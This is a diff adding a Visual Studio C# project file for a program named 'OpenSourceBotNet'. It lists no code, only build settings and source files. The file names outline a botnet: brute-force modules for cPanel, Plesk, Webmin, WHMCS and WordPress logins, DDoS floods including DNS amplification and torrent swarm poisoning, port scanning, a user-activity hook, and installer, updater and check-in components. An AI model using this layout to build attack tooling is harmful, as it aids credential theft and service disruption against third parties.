@@ -1,0 +1,175 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="12.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{A4EB03AD-C66D-417C-A59B-205966D22BDE}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>OpenSourceBotNet</RootNamespace>
+    <AssemblyName>OpenSourceBotNet</AssemblyName>
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Interop.Shell32">
+      <HintPath>Vendor\Interop.Shell32.dll</HintPath>
+      <EmbedInteropTypes>True</EmbedInteropTypes>
+    </Reference>
+    <Reference Include="Microsoft.Win32.TaskScheduler, Version=2.2.2.26204, Culture=neutral, PublicKeyToken=0d013ddd5178a2ae, processorArchitecture=MSIL">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>..\..\..\..\legacy\conSweetDreams\conSweetDreams\Microsoft.Win32.TaskScheduler.dll</HintPath>
+    </Reference>
+    <Reference Include="PacketDotNet">
+      <HintPath>Vendor\PacketDotNet.dll</HintPath>
+    </Reference>
+    <Reference Include="SharpPcap">
+      <HintPath>Vendor\SharpPcap.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Web" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Core\Plugins\FluxEngine.cs" />
+    <Compile Include="Plugins\Engines\Abstracts\FluxEnginePlugin.cs" />
+    <Compile Include="Plugins\Engines\Abstracts\FluxEngineWorkObject.cs" />
+    <Compile Include="Core\Flux.cs" />
+    <Compile Include="Core\Abstracts\FluxObject.cs" />
+    <Compile Include="Core\Abstracts\FluxPlugin.cs" />
+    <Compile Include="Core\FluxCapacitor.cs" />
+    <Compile Include="Core\FluxReactor.cs" />
+    <Compile Include="Core\Plugins\FluxService.cs" />
+    <Compile Include="Core\Helpers\FluxGlobal.cs" />
+    <Compile Include="Core\Helpers\FluxInstaller.cs" />
+    <Compile Include="Core\Helpers\FluxUpdater.cs" />
+    <Compile Include="Core\Helpers\FluxApiClient.cs" />
+    <Compile Include="Plugins\Engines\BruteForce\BruteForceEngine.cs" />
+    <Compile Include="Plugins\Engines\BruteForce\BruteForceEnginePlugin.cs" />
+    <Compile Include="Plugins\Engines\BruteForce\Plugins\CPanel.cs" />
+    <Compile Include="Plugins\Engines\BruteForce\Plugins\PleskPanel.cs" />
+    <Compile Include="Plugins\Engines\BruteForce\Plugins\Webmin.cs" />
+    <Compile Include="Plugins\Engines\BruteForce\Plugins\WHMCS.cs" />
+    <Compile Include="Plugins\Engines\BruteForce\Plugins\Wordpress.cs" />
+    <Compile Include="Plugins\Engines\DDoS\DDoSEngine.cs" />
+    <Compile Include="Plugins\Engines\DDoS\DDoSEnginePlugin.cs" />
+    <Compile Include="Plugins\Engines\DDoS\DDoSPluginPlugin.cs" />
+    <Compile Include="Plugins\Engines\DDoS\Plugins\DNS.cs" />
+    <Compile Include="Plugins\Engines\DDoS\Plugins\DNS\Amplification.cs" />
+    <Compile Include="Plugins\Engines\DDoS\Plugins\DNS\ExcessQueries.cs" />
+    <Compile Include="Plugins\Engines\DDoS\Plugins\IRC\DCCBomber.cs" />
+    <Compile Include="Plugins\Engines\DDoS\Plugins\IRC\ExcessFlood.cs" />
+    <Compile Include="Plugins\Engines\DDoS\Plugins\Torrents\ClientDropper.cs" />
+    <Compile Include="Plugins\Engines\DDoS\Plugins\Torrents\TorrentKiller.cs" />
+    <Compile Include="Plugins\Engines\DDoS\Plugins\WWW\RequestFlood.cs" />
+    <Compile Include="Plugins\Engines\DDoS\Plugins\WWW\SearchBomber.cs" />
+    <Compile Include="Plugins\Engines\DDoS\Plugins\Torrents.cs" />
+    <Compile Include="Plugins\Engines\DDoS\Plugins\Generic\ConnectionFlood.cs" />
+    <Compile Include="Plugins\Engines\DDoS\Plugins\Generic\PingMinusF.cs" />
+    <Compile Include="Plugins\Engines\DDoS\Plugins\Torrents\SwarmPoisoning.cs" />
+    <Compile Include="Plugins\Engines\TargetRecon\Plugins\PortScanner.cs" />
+    <Compile Include="Plugins\Engines\TargetRecon\Plugins\PortScanner\IRC.cs" />
+    <Compile Include="Plugins\Engines\TargetRecon\Plugins\PortScanner\MySQL.cs" />
+    <Compile Include="Plugins\Engines\TargetRecon\Plugins\WebCrawler.cs" />
+    <Compile Include="Plugins\Engines\TargetRecon\Plugins\WebCrawler\Magento.cs" />
+    <Compile Include="Plugins\Engines\TargetRecon\Plugins\WebCrawler\Wordpress.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Plugins\Services\ExeMonitors\TorMonitor.cs" />
+    <Compile Include="Plugins\Services\Heartbeats\CheckIn.cs" />
+    <Compile Include="Plugins\Services\Abstracts\ExeMonitor.cs" />
+    <Compile Include="Plugins\Services\Heartbeats\IdleCheck.cs" />
+    <Compile Include="Plugins\Services\Resources\CPUThrottle.cs" />
+    <Compile Include="Plugins\Services\Resources\NetworkThrottle.cs" />
+    <Compile Include="Vendor\Sockets\ProxySocket\AuthMethod.cs" />
+    <Compile Include="Vendor\Sockets\ProxySocket\AuthNone.cs" />
+    <Compile Include="Vendor\Sockets\ProxySocket\AuthUserPass.cs" />
+    <Compile Include="Vendor\Sockets\ProxySocket\IAsyncProxyResult.cs" />
+    <Compile Include="Vendor\Sockets\ProxySocket\ProxyException.cs" />
+    <Compile Include="Vendor\Sockets\ProxySocket\ProxySocket.cs" />
+    <Compile Include="Vendor\Sockets\ProxySocket\Socks4Handler.cs" />
+    <Compile Include="Vendor\Sockets\ProxySocket\Socks5Handler.cs" />
+    <Compile Include="Vendor\Sockets\ProxySocket\SocksHandler.cs" />
+    <Compile Include="Vendor\Sockets\Webclient\SocksWebClient.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Vendor\Sockets\Webclient\SocksWebRequest.cs" />
+    <Compile Include="Vendor\Sockets\Webclient\webclient.cs" />
+    <Compile Include="Vendor\Sockets\Webclient\WebclientFactory.cs" />
+    <Compile Include="Vendor\Utils\Crypto.cs" />
+    <Compile Include="Vendor\Utils\EmbeddedAssembly.cs" />
+    <Compile Include="Vendor\Utils\fingerprint.cs" />
+    <Compile Include="Vendor\Utils\runExe.cs" />
+    <Compile Include="Vendor\Utils\ShellLink.cs" />
+    <Compile Include="Vendor\Utils\SystemIdle.cs" />
+    <Compile Include="Vendor\Utils\UserActivityHook.cs" />
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Resources.resx</DependentUpon>
+    </Compile>
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="App.config" />
+  </ItemGroup>
+  <ItemGroup>
+    <ProjectReference Include="..\..\System.Net.Torrent\System.Net.Torrent.csproj">
+      <Project>{1c7a915c-76c2-41f2-bf9c-6a7b95fa0423}</Project>
+      <Name>System.Net.Torrent</Name>
+    </ProjectReference>
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="Vendor\Microsoft.Win32.TaskScheduler.dll" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  <Target Name="BeforeBuild">
+  </Target>
+  <Target Name="AfterBuild">
+  </Target>
+  -->
+</Project>
